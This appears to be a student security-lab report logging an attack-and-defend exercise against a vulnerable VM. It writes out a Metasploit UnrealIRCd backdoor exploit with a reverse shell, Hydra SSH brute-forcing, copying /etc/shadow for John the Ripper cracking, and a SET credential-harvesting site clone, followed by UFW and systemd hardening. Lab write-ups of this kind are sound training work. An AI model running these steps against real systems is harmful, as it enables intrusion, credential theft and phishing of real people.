🐧 Linux Security, Auditing & Hardening Cheat Sheet (Task 4)
*Compiled by Fatimah Adnan (ID: APSPL2631283) for the ApexPlanet Security Framework.*

📂 1. Repository Screenshot Mapping Blueprint
To maintain an enterprise-ready portfolio, all verification screenshots must be uploaded directly to the root directory following this logical matrix:

Directory: screenshots/01-recon-scanning/
Target verification terminal outputs (ifconfig showing 192.168.56.102).

Metasploit framework status checks showing connected database state (db_status).

Aggressive service discovery data sweeps (db_nmap -sV).

Directory: screenshots/02-exploitation/
Active Metasploit console logging configuration options for the UnrealIRCd exploit module.

Successful interactive reverse shell session upgrade sequence.

Post-exploitation session outputs confirming administrative execution access (whoami -> root).

Hydra terminal brute-force password tracking logs against SSH.

John the Ripper hash cracking outputs exposing plain-text target credentials.

Directory: screenshots/03-social-engineering/
Social-Engineer Toolkit (SET) configuration console selection states.

Plain-text data arrays capturing mock credentials via the cloned interface proxy.

Directory: screenshots/04-malware-analysis/
Static string signatures extracted from the benign application binary.

Dynamic system call interception structures (strace) showing proper validation exits.

Directory: screenshots/05-system-hardening/
Uncomplicated Firewall rule mappings verifying the strict global drop engine status (sudo ufw status verbose).

Systemd boot optimization logs confirming structural decommissioning of unnecessary target daemons (ModemManager.service).

🔬 2. Technical Lab Phase Log Analysis
Phase 1: Reconnaissance & Target Mapping
The framework was initialized on the attacker machine (Kali Linux), ensuring the persistent PostgreSQL storage module was listening correctly.

Command Sequence:

msfdb init

msfconsole

db_status

Expected Output Log: [*] postgresql connected to msf

A service version and operating system banner scanning sweep was routed through the active database link against the target machine container:

Scan Command: db_nmap -sV -O -T4 192.168.56.102

Analysis Notes: The scan mapped out 23 open TCP ports, revealing a critical attack surface including outdated software instances like vsftpd 2.3.4, OpenSSH 4.7p1, and UnrealIRCd.

Phase 2: Vulnerability Exploitation (UnrealIRCd Backdoor)
The reconnaissance data flagged an old backdoor vulnerability inside the IRC daemon running on target port 6667.

Exploit Steps:

use exploit/unix/irc/unreal_ircd_3281_backdoor

set RHOSTS 192.168.56.102

set PAYLOAD cmd/unix/reverse

set LHOST 192.168.56.101

exploit

Session Capture Log:
[] 192.168.56.102:6667 - Connected to the IRC server...
[] 192.168.56.102:6667 - Sending backdoor command execution payload...
[] Accepted reverse connection from 192.168.56.102
[] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49211)

Post-Exploitation Root System Audits:
Once the interactive terminal layer stabilized, low-level identification tasks were run to evaluate rights limits:

Command: whoami
Output: root

Command: id
Output: uid=0(root) gid=0(root)

Phase 3: Credential Cracking & Password Attacks
Online Password Brute-Forcing:
Using target service verification lists, automated dictionary sprays were directed at the OpenSSH service endpoint:

Command: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4

Offline Security Account Database Decryption:
Using the established root access session from Phase 2, target identification file strings were extracted for local dictionary matrix mapping.

First, extract the sensitive asset files from the host target:

cat /etc/passwd > /tmp/target_passwd

cat /etc/shadow > /tmp/target_shadow

Next, merge the asset files together and compute hashes locally on Kali Linux via John the Ripper:
3. unshadow /tmp/target_passwd /tmp/target_shadow > /tmp/target_hashes
4. john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/target_hashes

Phase 4: Social Engineering Phishing Simulation
To evaluate identity management threats against human targets, a credential logging proxy site was mapped using the Social-Engineer Toolkit.

Initialization Command: sudo setoolkit

Tool Navigation Sequence:

Social-Engineering Attacks

Website Attack Vectors

Credential Harvester Attack Method

Site Cloner

Configuration Log:
set:webattack> IP address for the POST back redirection: 192.168.56.101
set:webattack> Enter the URL to clone: https://auth.enterprise-portal.local
[] Cloning the website security login interface...
[] Initializing web server daemon on port 80...

Intercepted Variable Capture Buffer:
PARAM: username=test_employee@apexplanet.com
PARAM: password=UnsecurePassword123!

Phase 5: Behavioral Binary Diagnostics (Malware Analysis Baseline)
To train endpoint defensive systems, static and structural executions of binary images were logged using /usr/bin/whoami inside an isolated testing sandbox.

Static Code Asset Isolation:
Command: strings /usr/bin/whoami

Audit Observations: Evaluated string pointers indicating standard operating structure. Found references to core platform environment bindings like libc.so.6, program_invocation_name, and standard help definitions. No external domain URLs or suspicious compilation tracking variables were discovered.

Dynamic Runtime Interception:
Command: strace whoami

Low-Level Call Log Sequence Mapping:
execve("/usr/bin/whoami", ["whoami"], 0x7ffe6bfa...) = 0
brk(NULL)                               = 0x55b172b21000
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=83921, ...}) = 0
mmap(NULL, 83921, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3941b2c000
close(3)                                = 0x0
write(1, "root\n", 5)                  = 5
exit_group(0)                           = ?

Diagnostic Breakdown: The binary correctly opens standard kernel optimization links, routes program information directly to standard memory spaces, reads the specific active workspace name string, prints it out through a validated terminal display request (write), and exits gracefully without attempting unauthorized outbound connections.

Phase 6: System Hardening & Mitigation Action Matrix
Network Access Control Isolation (UFW):

sudo ufw default deny incoming

sudo ufw default allow outgoing

sudo ufw allow 22/tcp

sudo ufw allow 80/tcp

sudo ufw enable

Verification Logic Audit:
Command: sudo ufw status verbose

Output Check: Confirmed status is active. Default incoming action is mapped to deny. Open entry corridors are restricted strictly to port 22 and port 80, neutralizing unauthenticated background listener services like port 1524 and port 6667.

Operating System Process Minimization:
To eliminate unnecessary dependencies that could expand system attack surfaces, target configurations were modified to drop unused background tracking components.

Locate active targets running out of systemd settings:
Command: systemctl list-unit-files --state=enabled | grep Modem

Completely isolate and lock down the tracking daemon component:

sudo systemctl stop ModemManager

sudo systemctl disable ModemManager

sudo systemctl mask ModemManager
